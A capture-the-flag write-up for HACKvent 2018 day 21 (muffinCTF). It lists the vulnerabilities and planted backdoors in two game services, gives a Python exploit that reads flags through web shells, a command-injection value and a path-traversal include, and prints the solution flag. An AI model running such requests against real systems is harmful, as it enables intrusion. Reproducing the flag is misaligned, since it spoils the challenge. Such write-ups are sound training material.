# Day 21: MuffinCTF

*Day 1*

```
DAY 1 Services
--------------------------------------------
       _______
      /       )
     /_____   | ______
    (  '   ) / /    __\   _____
     |.  '| / |     \ |  /     ))
     |____|/  |`-----'  /_____))
               `-----'  `------'

    Name: bakery
    Description:
        Simply the best bakery in town!
        The good smell goes around the streets.
        Make sure that the thieves of the enemy nations cannot steal our bread!
        Maybe you have a method where we can get more bread?
    Creator: muffinx


            / \  _  _  _  / \
            | | / \/ \/ \ | |
        %   | |I| || || |=o | %
        %   | | j_jj_jj_j | | %     v %
      V |   | ||_________|| | | .:,>@<%%
     >@<| ; | | | || || | | | | ~*~ | |%
     *| |:X:| |I| || || | | | |*'|`\|/||   ~@~   *
    ,||/|`|'|_| |_||_||_| |_|,||,|/ |,||Vv,`|',v`|v hjw

    Name: garden
    Description:
        A very beautiful vegetable/fruit garden.
        There is even a pond where there are swimming fish and jumping frogs.
        Fix the defenses, in our past we had attacks with fire arrows.
        Also we are short in potatoes, please get us some more.
    Creator: muffinx
```

Login to: [muffinCTF](http://whale.hacking-lab.com:9280/)

### Description

To get the HACKvent day 21 (muffinCTF day 1), you had to achieve the following requirements, in at least 2 of the last 5 ticks (1 tick = 3 minutes).

Have [garden](files/garden.zip) or/and [bakery](files/bakery.zip) service running with the following stats:
 - attack points > 0
 - maximal defense points
 - maximal availability points
 
Here is a copy of the [official instructions](INSTRUCTIONS.md).

### Solution

I went through all of the source files to find vulnerabilities of those services. Here is what I found.

##### Bakery

- Sneaky remote shell backdoor in `/home/bakery/.../.php`
- Path traversal vulnerability in `/home/bakery/inc/inc.php`
- Eval injection in `/home/bakery/inc/breads.php`
- Arbitrary PHP page upload in `/home/bakery/inc/breads.php`
- Arbitrary command execution in `/home/bakery/inc/breadSend.php`
- Another sneaky remote shell hidden in `/home/bakery/css/components.checkbox.php`

##### Garden

- Potential SSTi in `/home/garden/templates/home.html`
- SQLi in `/home/garden/main.py`
- Arbitrary code execution via `yaml.load()` in `/home/garden/main.py`
- Publicly accessible database file `garden.db` via symlink in static content folder `/home/garden/static`

Once I patched my services I took a look at other places and found several others backdoors.

- PHP remote shell in `/var/www/html/index.php`
- Python backdoor executing commands from an [anonbox](https://anonbox.net/en/) mailbox in `/home/keep/keep.py`
- Another Python backdoor listening to commands sent via chat channel in `/home/tunnel/tunn.py`
- Yet another Python backdoor in `/root/log.py`

I removed all of them and started my vuln_box.

Then I moved to preparation of my exploits using provided [attack library](../../src/main/python/hackvent2018/tools/muffin_ctf.py). Since I found more vulnerabilities in the bakery I focused solely on that service.

I ended up with this exploit which earned me the flag.

```python
def bakery_exploit(attack_url):
    output = ''

    # grep -hra muffinCTF /home/bakery/breads
    output += get_flags(attack_url + '.../.php?_=grep+-hra+muffinCTF+/home/bakery/breads')
    output += get_flags(attack_url + 'css/components/checkbox.php?_=grep+-hra+muffinCTF+/home/bakery/breads')
    output += get_flags(attack_url + 'inc/breadSend.php?ip=127.0.0.1%3Bgrep+-hra+muffinCTF+/home/bakery/breads')
    output += get_flags(attack_url + 'inc/inc.php?page=../../../var/www/html/index.php&c=grep+-hra+muffinCTF+/home/bakery/breads')

    return output

muffin_ctf.attack_all('bakery', bakery_exploit)
```

Complete source code of my exploit can be found [here](../../src/main/python/hackvent2018/Day21.py).

This is the flag I got.

```
HV18{muffinCTF{d4y_1_l3t_th3_g4m3s_b3g1n_st4y_c0v3r3d_f0r_m0r3_h4x_stuff}}
```
